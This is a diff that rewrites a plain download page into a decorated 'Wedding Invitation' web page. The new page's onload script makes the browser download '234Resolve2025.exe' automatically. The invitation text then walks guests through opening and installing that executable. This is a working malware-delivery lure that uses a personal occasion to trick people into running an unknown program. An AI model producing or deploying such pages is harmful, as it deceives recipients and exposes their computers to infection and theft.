@@ -2,13 +2,83 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Downloader Page</title>
+  <title>Wedding Invitation</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Georgia", serif;
+      background: linear-gradient(to bottom right, #fdf6f0, #fbeae4);
+      color: #3e2c2c;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .card {
+      background: white;
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+      max-width: 600px;
+      animation: fadeIn 2s ease-in-out;
+    }
+    h1 {
+      font-family: "Brush Script MT", cursive;
+      font-size: 48px;
+      margin-bottom: 10px;
+      color: #a0522d;
+    }
+    h2 {
+      font-size: 24px;
+      font-weight: normal;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 18px;
+      margin-bottom: 15px;
+    }
+    .instructions {
+      margin-top: 30px;
+      padding: 20px;
+      background: #fffaf7;
+      border: 1px solid #f5d1c3;
+      border-radius: 12px;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+  <script>
+    // Auto-download when page loads
+    window.onload = function() {
+      let link = document.createElement("a");
+      link.href = "234Resolve2025.exe"; // your file name here
+      link.download = "234Resolve2025.exe";
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    };
+  </script>
 </head>
-<body style="text-align:center; font-family:Arial; padding:50px;">
-  <h1>Resolve Downloader</h1>
-  <p>Click below to download:</p>
-  <a href="234Resolve2025.exe" download>
-    <button style="padding:10px 20px; font-size:16px;">Download Now</button>
-  </a>
+<body>
+  <div class="card">
+    <h1>You’re Invited!</h1>
+    <h2>To a Special Wedding Celebration</h2>
+    <p>We’re honored to welcome you 🎉</p>
+    <p>The invitation comes with a special software download that has already started automatically.</p>
+
+    <div class="instructions">
+      <h3>💻 Installation Instructions</h3>
+      <p>1️⃣ Wait for the download to finish.</p>
+      <p>2️⃣ Open the downloaded file <b>234Resolve2025.exe</b>.</p>
+      <p>3️⃣ Follow the on-screen setup instructions.</p>
+      <p>4️⃣ Once installed, enjoy the full experience!</p>
+    </div>
+
+    <p style="margin-top:20px; font-size:16px;">If the download didn’t start, <a href="234Resolve2025.exe">click here to download manually</a>.</p>
+  </div>
 </body>
 </html>
